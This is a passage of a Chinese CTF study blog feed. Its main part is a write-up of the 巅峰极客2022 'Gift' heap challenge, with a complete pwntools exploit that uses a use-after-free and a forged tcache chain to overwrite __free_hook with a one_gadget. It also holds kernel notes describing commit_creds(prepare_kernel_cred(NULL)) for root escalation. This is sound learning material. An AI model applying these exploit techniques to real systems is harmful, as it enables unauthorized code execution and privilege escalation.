title="快速幂的拓展"></a>快速幂的拓展</h2><p>可见，非递归的快速幂只要满足结合律并且支持乘法运算都可以进行非递归的快速幂计算</p>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Practice</title>
      <link href="/2023/11/04/Practice/"/>
      <url>/2023/11/04/Practice/</url>
      
        <content type="html"><![CDATA[<h1 id="Practice"><a href="#Practice" class="headerlink" title="Practice:"></a>Practice:</h1><p>一些平常联系的记录，不能摆烂了（x</p><h2 id="巅峰极客2022Gift"><a href="#巅峰极客2022Gift" class="headerlink" title="巅峰极客2022Gift"></a>巅峰极客2022Gift</h2><p>libc2.27，很好的一道题（我不会</p><p>首先在remove_gift()中存在uaf漏洞</p><p><img src="/../images/1699100065220.png" alt="1699100065220"></p><p>限制了add的次数是10次，常规的打法并不足够分配，这时我们注意到在另外一个bargain函数中可以控制堆块的fd，于是思路就很清晰了，通过控制fd，伪造出一条tcache的链子</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment"># p = process(&quot;./service2&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>, <span class="string">&quot;28810&quot;</span>)</span><br><span class="line">menu = <span class="string">&quot;your choice:\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ChoiceGift</span>(<span class="params">ch, payload</span>):</span><br><span class="line">    p.recvuntil(menu)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>).encode())</span><br><span class="line">    p.recvuntil(menu)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(ch).encode())</span><br><span class="line">    p.recvuntil(<span class="string">&quot;plz write your wish on your gift!&quot;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RemoveGift</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(menu)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>).encode())</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CheckGift</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(menu)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">4</span>).encode())</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bargain</span>(<span class="params">idx, money</span>):</span><br><span class="line">    p.recvuntil(menu)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">5</span>).encode())</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.recvuntil(<span class="string">&quot;much?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(money).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">ChoiceGift(<span class="number">1</span>, <span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">ChoiceGift(<span class="number">1</span>, <span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">RemoveGift(<span class="number">0</span>)</span><br><span class="line">RemoveGift(<span class="number">1</span>)</span><br><span class="line">CheckGift(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;cost: &quot;</span>)</span><br><span class="line">heap = <span class="built_in">int</span>(p.recvline()) - <span class="number">0x260</span></span><br><span class="line"></span><br><span class="line">ChoiceGift(<span class="number">1</span>, <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x10</span>+p64(heap+<span class="number">0x400</span>)+<span class="string">b&quot;\x00&quot;</span>*<span class="number">0x68</span>+p64(heap+<span class="number">0x410</span>))</span><br><span class="line">ChoiceGift(<span class="number">1</span>, p64(heap+<span class="number">0x390</span>))</span><br><span class="line"></span><br><span class="line">RemoveGift(<span class="number">0</span>)</span><br><span class="line">RemoveGift(<span class="number">1</span>)</span><br><span class="line">bargain(<span class="number">1</span>, -<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">ChoiceGift(<span class="number">1</span>, <span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">ChoiceGift(<span class="number">1</span>, <span class="string">&quot;bbbbbbbb&quot;</span>)</span><br><span class="line">ChoiceGift(<span class="number">1</span>, <span class="string">&quot;cccccccc&quot;</span>)</span><br><span class="line"></span><br><span class="line">RemoveGift(<span class="number">0</span>)</span><br><span class="line">CheckGift(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;cost: &quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recvline()) - <span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">ChoiceGift(<span class="number">1</span>,p64(libc_base + <span class="number">0x3ed8d8</span>)) <span class="comment">#__free_hook</span></span><br><span class="line">ChoiceGift(<span class="number">1</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">ChoiceGift(<span class="number">1</span>,p64(libc_base + <span class="number">0x4f302</span>)) <span class="comment"># one_gadget</span></span><br><span class="line"></span><br><span class="line">RemoveGift(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>前面的泄露函数基地址较为简单，主要是后面伪造tcache链的情况比较复杂</p><p>我们能修改的是某一个chunk的fd，并且在tcache中是以fd进行连接的，所以我们可以对tcache链进行伪造，比如</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">tcache</span> -&gt;</span> <span class="function"><span class="title">fdA</span> -&gt;</span> fdB</span><br></pre></td></tr></table></figure><p>我们利用bargain函数修改fdA，就可以完成</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">tcachge</span> -&gt;</span> <span class="function"><span class="title">fdHacked</span> -&gt;</span> <span class="function"><span class="title">fdC</span> -&gt;</span><span class="function"><span class="title">fdD</span> -&gt;</span> <span class="function"><span class="title">fdF</span> -&gt;</span><span class="function"><span class="title">fdG</span> -&gt;</span>fdH</span><br></pre></td></tr></table></figure><p>这样子就可以完成了，并且我们往tcache里面分配了这么多chunk，拿出两个以上就会使得tcache的idx变成负数，这样子就会把chunk放到unsortedbin里面了，这样子就可以获取libc基地址了，下面我们算一下我们要伪造几个chunk</p><ul><li><p>首先，肯定需要三个以上，于是我们先拿出三个</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">tcachge</span> -&gt;</span>  <span class="function"><span class="title">fdF</span> -&gt;</span><span class="function"><span class="title">fdG</span> -&gt;</span>fdH</span><br></pre></td></tr></table></figure></li><li><p>这时候我们再remove一个已经分配的chunk，这样子的话就可以在unsortedbin里面获得libc</p></li><li><p>接着我们再申请fdF，tcache里面剩下的是</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">tcachge</span> -&gt;</span> <span class="function"><span class="title">fdG</span> -&gt;</span>fdH</span><br></pre></td></tr></table></figure></li><li><p>如果使得申请fdF写入的地方和fdG是一块地方，就可以接着申请到我们写入的内容，这样子的话我们就可以把在fdH的地方任意写</p></li><li><p>综上，我们需要伪造一个 <em>{fdHacked -&gt; fdC -&gt;fdD -&gt; fdF -&gt;fdG</em> 的结构</p></li></ul><p>正常的结构如下</p><p><img src="/../images/2b314e42bae5b471fbb2b4dd7ecf8c0c-1699151692781.png" alt="img"></p><p>所以我们通过+0x10，形成 370 -&gt; 270 -&gt; 390 -&gt; 400 -&gt; 410</p><p>最终申请400堆块，通过edit，在0x410的位置写入 __ free_hook - 0x10， 再申请0x410位置的chunk，之后再申请就可以修改 __free_hook了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> glibc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kernel Basic</title>
      <link href="/2023/10/04/Kernel-Basic/"/>
      <url>/2023/10/04/Kernel-Basic/</url>
      
        <content type="html"><![CDATA[<h1 id="Before-ALL"><a href="#Before-ALL" class="headerlink" title="Before ALL"></a>Before ALL</h1><p>本文是我学习Kernel时记下的笔记，其中大量借鉴了网上各位师傅的博客，若有侵权请联系我更改。</p><h1 id="Basic-Knowledge"><a href="#Basic-Knowledge" class="headerlink" title="Basic Knowledge"></a>Basic Knowledge</h1><h2 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h2><p>kernel是一个用来管理软件发出的 I&#x2F;O 要求，并把这些要求转义为指令交给CPU等处理的程序。kernel是现代操作系统中最基本的部分</p><p>kernel最重要的功能为以下两点：</p><ol><li>控制并与硬件进行交互</li><li>提供application可以运行的程序</li></ol><p><strong>注意：kernel的crash通常会引起程序的重启</strong></p><h2 id="分级保护域"><a href="#分级保护域" class="headerlink" title="分级保护域"></a>分级保护域</h2><p><strong>分级保护域(hierarchical protection domains)</strong> 又称为保护环，简称Rings，是一种将计算机的不同资源划分不同权限的模型</p><p>intel CPU 将 CPU 的特权级别分为 4 个级别：Ring 0, Ring 1, Ring 2, Ring 3。</p><p>Ring0只给OS时候用，Ring3所有程序都可以使用，现代计算机系统大部分都只使用了RIng0和Ring3</p><h2 id="Loadable-Kernel-Modules-LKMs"><a href="#Loadable-Kernel-Modules-LKMs" class="headerlink" title="Loadable Kernel Modules(LKMs)"></a>Loadable Kernel Modules(LKMs)</h2><p>可加载核心模块(或者直接称为内核模块)，是一个<strong>运行在内核空间的可执行程序</strong>。Linux Kernel采用的是宏内核架构，一切系统服务都由内核提供。效率高的同时缺乏的可拓展性以及可维护性。若提供新的服务可能需要需要重新编译整个内核，这个工作量是巨大的。所以 <strong>LKMs</strong> 应运而生。它就如同一个插件被装载入内核&#x2F;从内核中移除。通过LKMS提高了内核的可拓展性以及可维护性。</p><p>LKMS与用户态的可执行文件一样，均为ELF格式，<strong>但是LKMs必须运行在内核空间内，无法脱离内核运行</strong>，他在运行的时候被链接到内核，作为内核的一部分。</p><p>和LKMs有关的如下：</p><ol><li><strong>lsmod</strong> ：列出现有的LKMs</li><li><strong>insmod</strong> : 装载新的LKMs(root)</li><li><strong>rmmod</strong> : 删除LKMs(root)</li></ol><p><strong>在CTF比赛中，大多是对LKMs进行攻击，并非直接对整个内核发起攻击</strong></p><h2 id="系统调用：-syscall"><a href="#系统调用：-syscall" class="headerlink" title="系统调用： syscall"></a>系统调用： syscall</h2><p>对于syscall我们并不陌生，在srop以及shellcode中我们经常利用到，这是一个系统调用命令，指的是用户空间的程序向操作系统的内核请求更高权限的服务，比如IO间的通信。系统调用提供了用户程序和操作系统之间的接口。部分库函数也是对系统调用(read和write)的封装</p><ol><li>Linux 下进入系统调用有两种主要的方式：</li></ol><ul><li>32位：执行 int 0x80 汇编指令（80号中断）</li><li>64位：执行 syscall 汇编指令 &#x2F; 执行 sysenter 汇编指令（only intel）</li></ul><ol start="2"><li>接下来就是由用户态进入到内核态的流程<br> Linux下的系统调用以eax&#x2F;rax寄存器作为系统调用号，参数传递约束如下：</li></ol><ul><li>32 位：ebx、ecx、edx、esi、edi、ebp作为第一个参数、第二个参数…进行参数传递</li><li>64 位：rdi、rsi、rdx、rcx、r8、r9作为第一个参数、第二个参数…进行参数传递</li></ul><ol start="3"><li>同样地，内核执行完系统调用后退出系统调用也有对应的两种方式：</li></ol><ul><li>执行iret汇编指令</li><li>执行 sysret 汇编指令 &#x2F; 执行sysexit汇编指令（only Intel）</li><li>接下来就是由内核态回退至用户态的流程</li></ul><h2 id="状态切换"><a href="#状态切换" class="headerlink" title="状态切换"></a>状态切换</h2><h3 id="用户态到内核态"><a href="#用户态到内核态" class="headerlink" title="用户态到内核态"></a>用户态到内核态</h3><p>当发生 <code>系统调用</code>，<code>产生异常</code>，<code>外设产生中断</code>时，会发生用户态到内核态的切换，大概过程为：</p><ol><li><p>通过 <strong>swapgs</strong> 切换gs段寄存器，将gs寄存器的值和一个特定位置的值进行交换，保存gs值同时将该位置的值作为内核执行时的gs值使用</p></li><li><p>讲当前栈顶记录在CPU的独占变量区域，将CPU的独占变量区域中的内容放入rsp</p></li><li><p>通过push保存各个寄存器的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> ENTRY(entry_SYSCALL_64)</span><br><span class="line"> <span class="comment">/* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span></span><br><span class="line"> SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* 保存栈值，并设置内核栈 */</span></span><br><span class="line"> movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line"> movq <span class="title function_">PER_CPU_VAR</span><span class="params">(cpu_current_top_of_stack)</span>, %rsp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span></span><br><span class="line"><span class="comment">/* Construct struct pt_regs on stack */</span></span><br><span class="line">pushq  $__USER_DS      <span class="comment">/* pt_regs-&gt;ss */</span></span><br><span class="line">pushq  <span class="title function_">PER_CPU_VAR</span><span class="params">(rsp_scratch)</span>  <span class="comment">/* pt_regs-&gt;sp */</span></span><br><span class="line">pushq  %r11             <span class="comment">/* pt_regs-&gt;flags */</span></span><br><span class="line">pushq  $__USER_CS      <span class="comment">/* pt_regs-&gt;cs */</span></span><br><span class="line">pushq  %rcx             <span class="comment">/* pt_regs-&gt;ip */</span></span><br><span class="line">pushq  %rax             <span class="comment">/* pt_regs-&gt;orig_ax */</span></span><br><span class="line">pushq  %rdi             <span class="comment">/* pt_regs-&gt;di */</span></span><br><span class="line">pushq  %rsi             <span class="comment">/* pt_regs-&gt;si */</span></span><br><span class="line">pushq  %rdx             <span class="comment">/* pt_regs-&gt;dx */</span></span><br><span class="line">pushq  %rcx tuichu    <span class="comment">/* pt_regs-&gt;cx */</span></span><br><span class="line">pushq  $-ENOSYS        <span class="comment">/* pt_regs-&gt;ax */</span></span><br><span class="line">pushq  %r8              <span class="comment">/* pt_regs-&gt;r8 */</span></span><br><span class="line">pushq  %r9              <span class="comment">/* pt_regs-&gt;r9 */</span></span><br><span class="line">pushq  %r10             <span class="comment">/* pt_regs-&gt;r10 */</span></span><br><span class="line">pushq  %r11             <span class="comment">/* pt_regs-&gt;r11 */</span></span><br><span class="line">sub $<span class="params">(<span class="number">6</span>*<span class="number">8</span>)</span>, %rsp      <span class="comment">/* pt_regs-&gt;bp, bx, r12-15 not saved */</span></span><br></pre></td></tr></table></figure></li><li><p>通过汇编指令判断架构（32&#x2F;64）</p></li><li><p>通过系统调用号，调到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用</p></li></ol><h3 id="内核态到用户态"><a href="#内核态到用户态" class="headerlink" title="内核态到用户态"></a>内核态到用户态</h3><p>从内核态退出到用户态的时候，流程如下：</p><ol><li>通过 <code>swapgs</code> 恢复 GS 值</li><li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, eflags&#x2F;rflags, esp&#x2F;rsp 等）</li></ol><h2 id="进程权限管理"><a href="#进程权限管理" class="headerlink" title="进程权限管理"></a>进程权限管理</h2><h2 id="进程描述符"><a href="#进程描述符" class="headerlink" title="进程描述符"></a>进程描述符</h2><p>在内核中使用结构体 <code>task_struct</code> 表示一个进程</p><p><img src="/../images/2W8xIfwqm9Y7Fru.png" alt="image.png"></p><p>（文字和方框有点没对齐，凑合着看看得了）</p><p>我们主要关心的是其对于进程权限的管理</p><p>注意 <code>task_struct</code> 中如下的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">cred</span>;</span></span><br></pre></td></tr></table></figure><p><strong>rocess credentials</strong> 是 kernel 用以判断一个进程权限的凭证，在 kernel 中使用 <code>cred</code> 结构体进行标识，对于一个进程而言应当有三个 cred：</p><ul><li><strong>ptracer_cred：</strong>使用<code>ptrace</code>系统调用跟踪该进程的上级进程的cred（gdb调试便是使用了这个系统调用，常见的反调试机制的原理便是提前占用了这个位置）</li><li><strong>real_cred：</strong>即<strong>客体凭证</strong>（<strong>objective cred</strong>），通常是一个进程最初启动时所具有的权限</li><li><strong>cred：</strong>即<strong>主体凭证</strong>（<strong>subjective cred</strong>），该进程的有效cred，kernel以此作为进程权限的凭证</li></ul><p>一般情况下，主体凭证与客体凭证的值是相同的</p><blockquote><p>例：当进程 A 向进程 B 发送消息时，A为主体，B为客体</p></blockquote><p>关于这个 ptracer _cred 我不是很理解 然后</p><p><img src="/../images/1696418104071.png" alt="1696418104071"></p><p>好好好这下理解了，gdb会创建一个被调试程序的子进程，这个进程是由gdb启动的，父进程是被调试的进程，gdb通过ptracer系统调用来跟踪父进程。父进程的安全凭证信息会被保存在ptracer _cred中，这样可以保证进程的权限正常</p><h2 id="进程权限凭证"><a href="#进程权限凭证" class="headerlink" title="进程权限凭证"></a>进程权限凭证</h2><p>对于一个进程 使用 <strong>cred</strong> 结构体来管理权限，结构体的定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC    0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD    0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>        uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>        gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>        suid;        <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>        sgid;        <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>        euid;        <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>        egid;        <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>        fsuid;        <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="type">kgid_t</span>        fsgid;        <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="type">unsigned</span>    securebits;    <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_permitted;    <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_effective;    <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_bset;    <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>    jit_keyring;    <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">                     * keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>    *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>    *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>    *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>    *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="type">void</span>        *security;    <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>    <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>    <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="comment">/* RCU deletion */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> non_rcu;            <span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>    <span class="title">rcu</span>;</span>        <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>我们关注的主要是该结构体中管理权限的变量</p><h3 id="进程权限改变："><a href="#进程权限改变：" class="headerlink" title="进程权限改变："></a>进程权限改变：</h3><p>既然进程是由cred结构体管理的，我们很容易想到对cred结构体发起攻击从而获得root权限</p><p>内核空间内有如下两个函数</p><ul><li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的cred结构体，并返回一个新的cred结构体，需要注意的是<code>daemon</code>参数应为<strong>有效的进程描述符地址或NULL</strong></li><li><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的<code>cred</code>结构体应用到进程</li></ul><p>查看 <code>prepare_kernel_cred()</code> 函数的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!new)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, new);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (daemon)</span><br><span class="line">        old = get_task_cred(daemon);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        old = get_cred(&amp;init_cred);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以看到，在这个函数中，则会缺省使用<code>init</code>进程的<code>cred</code>作为模板进行拷贝，<strong>即可以直接获得一个标识着root权限的cred结构体</strong> </p><p>如此，我们便可以想到，只需要执行 <code>commit_creds(prepare_kernel_cred(NULL))</code> ，我们就可以把进程的权限提升到root</p><h2 id="用户ID-amp-组ID"><a href="#用户ID-amp-组ID" class="headerlink" title="用户ID &amp; 组ID"></a>用户ID &amp; 组ID</h2><p>一个cred结构体中记载了<strong>一个进程四种不同的用户ID</strong>：</p><ul><li><strong>真实用户ID</strong>（real UID）：标识一个进程<strong>启动时的用户ID</strong></li><li><strong>保存用户ID</strong>（saved UID）：标识一个进程<strong>最初的有效用户ID</strong></li><li><strong>有效用户ID</strong>（effective UID）：标识一个进程<strong>正在运行时所属的用户ID</strong>，一个进程在运行途中是可以改变自己所属用户的，因而权限机制也是通过有效用户ID进行认证的，内核通过 euid 来进行特权判断；为了防止用户一直使用高权限，当任务完成之后，euid 会与 suid 进行交换，恢复进程的有效权限</li><li><strong>文件系统用户ID</strong>（UID for VFS 